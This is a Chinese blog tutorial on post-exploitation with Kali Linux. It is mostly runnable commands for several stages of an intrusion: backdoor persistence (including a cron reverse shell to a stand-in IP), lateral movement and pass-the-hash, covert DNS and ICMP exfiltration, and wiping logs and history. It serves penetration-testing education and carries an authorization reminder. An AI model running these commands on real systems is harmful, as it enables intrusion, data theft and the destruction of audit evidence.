---
title: 后渗透操作与痕迹清理：渗透测试的收尾艺术
slug: kali后渗透操作与痕迹清理-k0j1k
date: 2026-08-30
visibility: public
tags: Kali Linux, 后渗透, 权限维持, 痕迹清理, 渗透测试, 教程
---

# 后渗透操作与痕迹清理：渗透测试的收尾艺术

获得 root/system 权限不是渗透测试的终点。后渗透阶段包括权限维持、横向移动、数据提取和痕迹清理，这些操作决定了渗透测试的完整性和专业性。本文介绍 Kali Linux 下的后渗透技术。

## 一、后渗透概述

```
渗透测试阶段：
信息收集 → 漏洞扫描 → 漏洞利用 → 权限提升 → 【后渗透】
                                                ↓
                                    权限维持
                                    横向移动
                                    数据提取
                                    痕迹清理
```

## 二、权限维持

### 1. Linux 权限维持

#### SSH 公钥后门

```bash
# 在攻击机上生成密钥对
ssh-keygen -t rsa -f /root/backdoor_key

# 将公钥写入目标
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# 免密登录
ssh -i backdoor_key root@target
```

#### Cron 后门

```bash
# 添加定时反弹 Shell
(crontab -l; echo "*/30 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'") | crontab -

# 或写入 /etc/cron.d/
echo "*/30 * * * * root /tmp/.hidden_shell.sh" > /etc/cron.d/backup
```

#### SUID 后门

```bash
# 复制 bash 并设置 SUID
cp /bin/bash /tmp/.rootbash
chmod u+s /tmp/.rootbash

# 使用时
/tmp/.rootbash -p
# -p 表示不切换 EUID，保持 root 权限
```

#### PAM 后门

```bash
# 修改 PAM 认证模块（高级后门）
# 在 /etc/pam.d/common-auth 中插入万能密码
# 需要编译修改 pam_unix.so，此操作较复杂
```

#### Rootkit

```bash
# Diamorphine Rootkit（演示用）
# 隐藏进程、文件、网络连接
# 加载后可通过 kill -31 0 提权
# 此操作仅作了解，实际使用需谨慎
```

### 2. Windows 权限维持

#### 注册表后门

```cmd
# 添加开机自启
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\shell.exe" /f

# 或者
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\shell.exe" /f
```

#### 计划任务后门

```cmd
# 创建计划任务
schtasks /create /tn "SystemUpdate" /tr "C:\shell.exe" /sc onlogon /ru System

# 每 30 分钟执行
schtasks /create /tn "Update" /tr "C:\shell.exe" /sc minute /mo 30 /ru System
```

#### 服务后门

```cmd
# 创建隐藏服务
sc create "SvcHost" binPath= "C:\shell.exe" start= auto
sc start SvcHost
```

#### WMI 后门（高级）

```powershell
# WMI 事件订阅后门
$m = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
    Name = "Backdoor";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

## 三、横向移动

### 1. 内网信息收集

```bash
# 存活主机发现
nmap -sn 10.0.0.0/24
fping -a -g 10.0.0.0/24 2>/dev/null

# 端口扫描（内网快速扫）
nmap -sS -T4 --top-ports 100 10.0.0.0/24

# ARP 扫描
arp-scan -I eth0 10.0.0.0/24
```

### 2. 内网代理

#### Meterpreter 路由

```meterpreter
# 添加内网路由
run autoroute -s 10.0.0.0/24
run autoroute -p

# 然后在 MSF 中直接扫描内网
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,445,3389
run
```

#### SOCKS 代理

```bash
# 在 MSF 中设置 SOCKS 代理
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run

# 配置 proxychains
# 编辑 /etc/proxychains.conf
# 添加：socks5 127.0.0.1 1080

# 通过代理访问内网
proxychains nmap -sT -Pn 10.0.0.5
proxychains ssh user@10.0.0.5
```

#### Chisel 隧道

```bash
# 攻击机（服务端）
chisel server -p 8080 --reverse

# 目标机（客户端）
chisel client 192.168.1.50:8080 R:socks
```

### 3. Pass the Hash（哈希传递攻击）

```bash
# 使用已有 NTLM 哈希直接认证（不需要明文密码）

# CrackMapExec
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.0.0.5

# Metasploit
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.5
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
exploit
```

### 4. 票据传递攻击（Kerberoasting）

```bash
# 使用 Rubeus 请求服务票据
Rubeus.exe kerberoast /outfile:hashes.txt

# 离线破解票据
hashcat -m 13100 hashes.txt rockyou.txt
```

## 四、数据提取

### 1. 文件打包与压缩

```bash
# Linux 打包
tar czf /tmp/backup.tar.gz /target/directory/
# 加密打包
tar czf - /target/directory/ | openssl enc -aes-256-cbc -out /tmp/backup.tar.gz.enc
# 解密
openssl enc -d -aes-256-cbc -in backup.tar.gz.enc | tar xzf -

# Windows 打包
# 使用 7z 加密压缩
7z a -p"Password123" backup.7z C:\Users\target\Documents\
```

### 2. 数据库数据提取

```bash
# MySQL
mysqldump -u root -p databasename > dump.sql
mysqldump -u root -p --all-databases > all_dumps.sql

# MSSQL
sqlcmd -S localhost -E -Q "BACKUP DATABASE mydb TO DISK='C:\backup.bak'"

# SQLite
sqlite3 database.db .dump > dump.sql
```

### 3. 隐蔽传输

```bash
# DNS 隧道（DNSCat2）
# 服务端
ruby dnscat2.rb example.com
# 客户端
dnscat2 --dns server=8.8.8.8,port=53 --security open example.com

# ICMP 隧道
ping -c 1 -p $(xxd -p data.txt | head -1) target.com

# HTTP 隧道（通过代理中转）
# 将数据编码为 Base64 通过 HTTP POST 发送
```

### 4. Meterpreter 数据传输

```meterpreter
# 下载文件
download C:\\Users\\target\\Documents\\secret.pdf

# 下载整个目录
download C:\\Users\\target\\Documents\\

# 上传工具
upload /root/tools/mimikatz.exe C:\\Users\\target\\

# 加载 stdapi 获取更多功能
load stdapi
```

## 五、痕迹清理

### 1. Linux 痕迹清理

```bash
# 清除命令历史
history -c
echo "" > ~/.bash_history
rm -f ~/.bash_history
# 禁用历史记录
unset HISTFILE
export HISTSIZE=0

# 清除登录记录
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/log/lastlog

# 清除审计日志
echo "" > /var/log/audit/audit.log
echo "" > /var/log/secure
echo "" > /var/log/auth.log

# 清除临时文件
rm -rf /tmp/.*
rm -rf /var/tmp/*

# 修改文件时间戳
touch -r /etc/passwd /tmp/backdoor
# 将 backdoor 的时间戳改为与 passwd 相同
```

### 2. Windows 痕迹清理

```cmd
# 清除事件日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl Setup
wevtutil cl ForwardedEvents

# PowerShell 清除所有日志
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }

# 清除 RDP 记录
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default" /f

# 清除最近文件记录
del /q /s %APPDATA%\Microsoft\Windows\Recent\*
```

### 3. Meterpreter 痕迹清理

```meterpreter
# 清除事件日志
clearev

# 清除 .bash_history
shell
history -c
```

### 4. 隐藏文件

```bash
# Linux 隐藏文件（以 . 开头）
mv backdoor.sh .backdoor.sh

# 修改文件属性（不可修改/删除）
chattr +i /etc/cron.d/backdoor

# Windows 隐藏文件
attrib +h C:\backdoor.exe
attrib +s +h C:\backdoor.exe  # 系统级隐藏
```

## 六、后渗透检查清单

```
□ 确认当前权限级别
□ 收集所有用户凭据
□ 检查可横向移动的目标
□ 提取关键数据样本
□ 评估权限维持方案
□ 清理操作痕迹
□ 整理发现并编写报告
□ 恢复系统原始状态（可选）
```

## 七、报告撰写

渗透测试最终交付物是报告，结构建议：

```
1. 执行摘要（管理层阅读）
2. 测试范围与方法
3. 发现概览（漏洞分布图）
4. 漏洞详情（每个漏洞）：
   - 漏洞名称
   - 严重等级（CVSS 评分）
   - 影响描述
   - 复现步骤
   - 截图证据
   - 修复建议
5. 附录（工具列表、原始数据）
```

## 安全提醒

> 后渗透技术涉及权限维持和数据提取，这些操作影响目标系统的安全性和可用性。在实际渗透测试中：1）所有操作需在授权范围内进行；2）测试完成后应清除所有后门和测试数据；3）报告中应包含完整的修复建议。

## 小结

- 权限维持确保持久化访问：Linux 用 SSH 密钥/Cron/SUID，Windows 用注册表/计划任务/服务
- 横向移动核心是内网代理：Meterpreter 路由 + SOCKS 代理 + proxychains
- Pass the Hash 可用哈希直接认证，无需破解明文密码
- 痕迹清理是专业渗透测试的基本要求
- 最终交付的渗透报告才是价值的体现

> 至此，Kali Linux 安全攻防系列 10 篇教程全部完成。从安装配置到信息收集、漏洞扫描、漏洞利用、密码攻击、Web 渗透、无线安全、权限提升到后渗透操作，覆盖了渗透测试全流程。安全是一个持续学习的过程，希望这个系列能帮助你入门并持续进阶。
